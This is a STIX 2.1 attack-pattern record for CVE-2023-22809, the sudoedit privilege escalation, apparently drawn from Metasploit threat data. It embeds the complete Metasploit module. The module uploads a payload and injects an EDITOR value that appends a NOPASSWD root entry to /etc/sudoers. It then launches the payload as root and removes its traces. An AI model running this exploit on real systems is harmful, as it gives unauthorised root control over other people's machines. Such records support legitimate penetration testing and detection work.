{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2e763bd-ef82-4952-bf4c-c92678305562",
    "created": "2024-08-14T16:59:34.404452Z",
    "modified": "2024-08-14T16:59:34.404456Z",
    "name": "Sudoedit Extra Arguments Priv Esc",
    "description": " This exploit takes advantage of a vulnerability in sudoedit, part of the sudo package. The sudoedit (aka sudo -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. by appending extra entries on /etc/sudoers allowing for execution of an arbitrary payload with root privileges.  Affected versions are 1.8.0 through 1.9.12.p1. However THIS module only works against Ubuntu 22.04 and 22.10.  This module was tested against sudo 1.9.9-1ubuntu2 on Ubuntu 22.04, and 1.9.11p3-1ubuntu1 on Ubuntu 22.10.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/sudoedit_bypass_priv_esc.rb",
            "external_id": "sudoedit_bypass_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/M4fiaB0y/CVE-2023-22809/blob/main/exploit.sh"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc/main/exploit.sh"
        },
        {
            "source_name": "reference",
            "url": "https://www.vicarius.io/vsociety/blog/cve-2023-22809-sudoedit-bypass-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466"
        },
        {
            "source_name": "reference",
            "url": "https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.sudo.ws/security/advisories/sudoedit_any/"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-22809"
        },
        {
            "source_name": "#accordingtoCVElisting",
            "external_id": "butsomuchbackporting..."
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Sudoedit Extra Arguments Priv Esc',\n        'Description' => %q{\n          This exploit takes advantage of a vulnerability in sudoedit, part of the sudo package.\n          The sudoedit (aka sudo -e) feature mishandles extra arguments passed in the user-provided\n          environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to\n          append arbitrary entries to the list of files to process. This can lead to privilege escalation.\n          by appending extra entries on /etc/sudoers allowing for execution of an arbitrary payload with root\n          privileges.\n\n          Affected versions are 1.8.0 through 1.9.12.p1. However THIS module only works against Ubuntu\n          22.04 and 22.10.\n\n          This module was tested against sudo 1.9.9-1ubuntu2 on Ubuntu 22.04, and\n          1.9.11p3-1ubuntu1 on Ubuntu 22.10.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Matthieu Barjole', # original PoC, analysis\n          'Victor Cutillas' # original PoC, analysis\n        ],\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'EDB', '51217' ],\n          [ 'URL', 'https://github.com/M4fiaB0y/CVE-2023-22809/blob/main/exploit.sh' ],\n          [ 'URL', 'https://raw.githubusercontent.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc/main/exploit.sh' ],\n          [ 'URL', 'https://www.vicarius.io/vsociety/blog/cve-2023-22809-sudoedit-bypass-analysis' ],\n          [ 'URL', 'https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466' ],\n          [ 'URL', 'https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf' ],\n          [ 'URL', 'https://www.sudo.ws/security/advisories/sudoedit_any/'],\n          [ 'CVE', '2023-22809' ]\n        ],\n        'DisclosureDate' => '2023-01-18',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES]\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),\n      OptString.new('EDITABLEFILE', [ false, 'A file which can be edited with sudo -e or sudoedit' ]),\n      OptString.new('SHELL', [ true, 'A shell we can launch our payload from. Bash or SH should be safe', '/bin/sh' ]),\n      OptInt.new('TIMEOUT', [true, 'The timeout waiting for sudo commands to respond', 10]),\n    ]\n  end\n\n  def timeout\n    datastore['TIMEOUT']\n  end\n\n  # Simplify pulling the writable directory variable\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def get_editable_file\n    if datastore['EDITABLEFILE'].present?\n      fail_with(Failure::BadConfig, 'EDITABLEFILE must be a file.') unless file?(datastore['EDITABLEFILE'])\n\n      vprint_status(\"Using user defined EDITABLEFILE: #{datastore['EDITABLEFILE']}\")\n      return datastore['EDITABLEFILE']\n    end\n\n    # we do a rev here to reverse the order since we only want the last entry (the file name), take item 1, then rev it back so its normal. this seemed to\n    # be the easiest way to do a cut -f -1 (negative one). https://stackoverflow.com/questions/22727107/how-to-find-the-last-field-using-cut\n    editable_file = cmd_exec('sudo -l -S | grep -E \"sudoedit|sudo -e\" | grep -E \\'\\\\(root\\\\)|\\\\(ALL\\\\)|\\\\(ALL : ALL\\\\)\\' | rev | cut -d \" \" -f 1 | rev')\n    editable_file = editable_file.strip\n    if editable_file.nil? || editable_file.empty? || editable_file.include?('a terminal is required to read the password') || editable_file.include?('password for')\n      return nil\n    end\n\n    return nil unless file?(editable_file)\n\n    editable_file\n  end\n\n  def get_sudo_version_from_sudo\n    package = cmd_exec('sudo --version')\n    package = package.split(' ')[2] # Sudo version XXX\n    begin\n      Rex::Version.new(package)\n    rescue ArgumentError\n      # this happens on systems like debian 8.7.1 which doesn't have sudo\n      Rex::Version.new(0)\n    end\n  end\n\n  def check\n    sys_info = get_sysinfo\n\n    # Check the app is installed and the version\n    if sys_info[:distro] == 'ubuntu' || sys_info[:distro] == 'debian'\n      package = cmd_exec('dpkg -l sudo | grep \\'^ii\\'')\n      package = package.split(' ')[2] # ii, package name, version, arch\n      begin\n        ver_no = Rex::Version.new(package)\n      rescue ArgumentError\n        ver_no = get_sudo_version_from_sudo\n      end\n    else\n      ver_no = get_sudo_version_from_sudo\n    end\n\n    # according to CVE listing, but so much backporting...\n    minimal_version = '1.8.0'\n    maximum_version = '1.9.12p1'\n    exploitable = false\n\n    # backporting... so annoying.\n    # https://ubuntu.com/security/CVE-2023-22809\n    if sys_info[:distro] == 'ubuntu'\n      if sys_info[:version].include? '22.10' # kinetic\n        exploitable = true\n        maximum_version = '1.9.11p3-1ubuntu1.1'\n      elsif sys_info[:version].include? '22.04' # jammy\n        exploitable = true\n        maximum_version = '1.9.9-1ubuntu2.2'\n      elsif sys_info[:version].include? '20.04' # focal\n        maximum_version = '1.8.31-1ubuntu1.4'\n      elsif sys_info[:version].include? '18.04' # bionic\n        maximum_version = '1.8.21p2-3ubuntu1.5'\n      elsif sys_info[:version].include? '16.04'  # xenial\n        maximum_version = '1.8.16-0ubuntu1.10+esm1'\n      elsif sys_info[:version].include? '14.04'  # trusty\n        maximum_version = '1.8.9p5-1ubuntu1.5+esm7'\n      end\n    end\n\n    if ver_no == Rex::Version.new(0)\n      return Exploit::CheckCode::Unknown('Unable to detect sudo version')\n    end\n\n    if ver_no < Rex::Version.new(maximum_version) && ver_no >= Rex::Version.new(minimal_version)\n      vprint_good(\"sudo version #{ver_no} is vulnerable\")\n      # check if theres an entry in /etc/sudoers that allows us to edit a file\n      editable_file = get_editable_file\n      if editable_file.nil?\n        if exploitable\n          return CheckCode::Appears(\"Sudo #{ver_no} is vulnerable, but unable to determine editable file. Please set EDITABLEFILE option manually\")\n        else\n          return CheckCode::Appears(\"Sudo #{ver_no} is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module\")\n        end\n      elsif exploitable\n        return CheckCode::Vulnerable(\"Sudo #{ver_no} is vulnerable, can edit: #{editable_file}\")\n      else\n        return CheckCode::Vulnerable(\"Sudo #{ver_no} is vulnerable, can edit: #{editable_file}. OS can NOT be exploited by this module\")\n      end\n    end\n\n    CheckCode::Safe(\"sudo version #{ver_no} may NOT be vulnerable\")\n  end\n\n  def exploit\n    # Check if we're already root\n    if !datastore['ForceExploit'] && is_root?\n      fail_with Failure::None, 'Session already has root privileges. Set ForceExploit to override'\n    end\n\n    if get_editable_file.nil?\n      fail_with Failure::BadConfig, 'Unable to automatically detect sudo editable file, EDITABLEFILE option is required'\n    end\n\n    # Make sure we can write our exploit and payload to the local system\n    unless writable?(base_dir) && directory?(base_dir)\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    sys_info = get_sysinfo\n\n    # Check the app is installed and the version\n    fail_with(Failure::NoTarget, 'Only Ubuntu 22.04 and 22.10 are exploitable by this module') unless sys_info[:distro] == 'ubuntu'\n    fail_with(Failure::NoTarget, 'Only Ubuntu 22.04 and 22.10 are exploitable by this module') unless sys_info[:version].include?('22.04') || sys_info[:version].include?('22.10')\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n    register_file_for_cleanup(payload_path)\n\n    @flag = Rex::Text.rand_text_alphanumeric(12)\n    print_status 'Adding user to sudoers'\n    # we tack on a flag so we can easily grep for this line and clean it up later\n    command = \"EDITOR=\\\"sed -i -e '$ a `whoami` ALL=(ALL:ALL) NOPASSWD: #{datastore['SHELL']} \\# #{@flag}' -- /etc/sudoers\\\" sudo -S -e #{get_editable_file}\"\n    vprint_status(\"Executing command: #{command}\")\n\n    output = cmd_exec command, nil, timeout\n    if output.include? '/etc/sudoers unchanged'\n      fail_with(Failure::NoTarget, 'Failed to edit sudoers, command was unsuccessful')\n    end\n\n    if output.include? 'sudo: ignoring editor'\n      fail_with(Failure::NotVulnerable, 'sudo is patched')\n    end\n\n    output.each_line { |line| vprint_status line.chomp }\n    print_status('Spawning payload')\n\n    # -S may not be needed here, but if exploitation didn't go well, we dont want to bork our shell\n    # also, attempting to thread off of sudo was problematic, solution was\n    # https://askubuntu.com/questions/1110865/how-can-i-run-detached-command-with-sudo-over-ssh\n    # other refs that didn't work: https://askubuntu.com/questions/634620/when-using-and-sudo-on-the-first-command-is-the-second-command-run-as-sudo-t\n    output = cmd_exec \"sudo -S -b sh -c 'nohup #{payload_path} > /dev/null 2>&1 &'\", nil, timeout\n    output.each_line { |line| vprint_status line.chomp }\n  end\n\n  def on_new_session(session)\n    if @flag\n      session.shell_command_token(\"sed -i '/\\# #{@flag}/d' /etc/sudoers\")\n      flag_found = session.shell_command_token(\"grep '#{@flag}' /etc/sudoers\")\n      if flag_found.include? @flag\n        print_bad(\"Manual cleanup is required, please run: sed -i '/\\# #{@flag}/d' /etc/sudoers\")\n      end\n    end\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-01-18",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}